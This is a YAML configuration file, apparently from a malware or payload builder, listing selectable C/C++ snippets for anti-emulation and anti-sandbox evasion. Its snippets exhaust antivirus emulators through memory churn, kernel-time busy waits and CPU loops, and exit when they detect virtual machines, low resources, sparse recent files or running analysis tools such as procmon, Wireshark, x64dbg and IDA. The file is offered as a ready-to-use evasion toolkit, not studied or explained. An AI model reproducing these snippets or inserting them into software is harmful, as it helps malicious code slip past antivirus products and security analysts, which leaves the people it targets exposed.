sections:
  # --------------------------------------------------------------------------
  # ANTI-EMULATION - Stealth Focus
  # --------------------------------------------------------------------------
  - header: "Anti Emulation"
    template: "antiemulation"
    display: "Anti-Emulation"
    allowMultiple: true
    items:
      - id: "SirAllocALot"
        display: "Memory Exhaustion (SirAllocALot)"
        default: true
        snippet: |
          // Exhaust AV emulator with memory allocations
          {
              const int ALLOC_COUNT = 150;
              const int ITERATIONS = 7;
              void* allocs[150];
              DWORD oldProt;

              for(int i = 0; i < ITERATIONS; i++) {
                  for(int n = 0; n < ALLOC_COUNT; n++) {
                      allocs[n] = VirtualAlloc(NULL, 8192, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                      if (allocs[n]) {
                          volatile char *p = (char*)allocs[n];
                          for(int j = 0; j < 8192; j += 64) p[j] = (char)(j ^ i);
                      }
                  }
                  for(int n = 0; n < ALLOC_COUNT; n++) {
                      if (allocs[n]) VirtualProtect(allocs[n], 8192, PAGE_EXECUTE_READ, &oldProt);
                  }
                  for(int n = 0; n < ALLOC_COUNT; n++) {
                      if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
                  }
              }
          }

      - id: "TimeRaw"
        display: "Kernel Time Delay"
        default: true
        snippet: |
          // Busy wait using kernel time register
          {
              auto get_time = []() -> DWORD {
                  return *(DWORD*)0x7ffe0320;
              };
              DWORD start = get_time();
              while (get_time() - start < 5000) {}
          }

      - id: "CpuIntensive"
        display: "CPU Exhaustion"
        default: false
        snippet: |
          // Heavy computation to exhaust emulator cycles
          {
              volatile unsigned int r = 0x12345678;
              for (unsigned int i = 0; i < 100000000; i++) {
                  r = (r << 1) | (r >> 31);
                  r ^= i;
              }
              if (r == 0) Sleep(1);
          }

  # --------------------------------------------------------------------------
  # ANTI-SANDBOX - Comprehensive Detection
  # --------------------------------------------------------------------------
  - header: "Anti Sandbox"
    template: "antisandbox"
    display: "Anti-Sandbox/VM"
    allowMultiple: true
    items:
      - id: "AllChecks"
        display: "Comprehensive VM/Sandbox Detection"
        default: true
        snippet: |
          // Combined sandbox detection checks
          {
              // Check 1: Hypervisor bit
              int cpuInfo[4];
              __cpuid(cpuInfo, 1);
              if (cpuInfo[2] & (1 << 31)) return 0;

              // Check 2: Low resources
              MEMORYSTATUSEX mem = {sizeof(mem)};
              if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 3ULL * 1024 * 1024 * 1024) return 0;

              // Check 3: Processor count
              SYSTEM_INFO si;
              GetSystemInfo(&si);
              if (si.dwNumberOfProcessors < 2) return 0;

              // Check 4: Recent files
              WCHAR recent[MAX_PATH];
              if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recent))) {
                  WIN32_FIND_DATAW fd;
                  WCHAR search[MAX_PATH];
                  wsprintfW(search, L"%s\\*", recent);
                  HANDLE hf = FindFirstFileW(search, &fd);
                  int count = 0;
                  if (hf != INVALID_HANDLE_VALUE) {
                      do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++; }
                      while (FindNextFileW(hf, &fd) && count < 10);
                      FindClose(hf);
                  }
                  if (count < 3) return 0;
              }

              // Check 5: Screen resolution
              if (GetSystemMetrics(SM_CXSCREEN) < 1024) return 0;
          }

      - id: "AnalysisProcesses"
        display: "Analysis Process Detection"
        default: true
        snippet: |
          // Detect analysis tools
          {
              const wchar_t* procs[] = {
                  L"procmon.exe", L"procexp.exe", L"wireshark.exe",
                  L"x64dbg.exe", L"ida.exe", L"idaq64.exe",
                  L"ollydbg.exe", L"fiddler.exe", L"processhacker.exe"
              };
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (snap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe = {sizeof(pe)};
                  if (Process32FirstW(snap, &pe)) {
                      do {
                          for (int i = 0; i < 9; i++) {
                              if (_wcsicmp(pe.szExeFile, procs[i]) == 0) {
                                  CloseHandle(snap);
                                  return 0;
                              }
                          }
                      } while (Process32NextW(snap, &pe));
                  }
                  CloseHandle(snap);
              }
          }

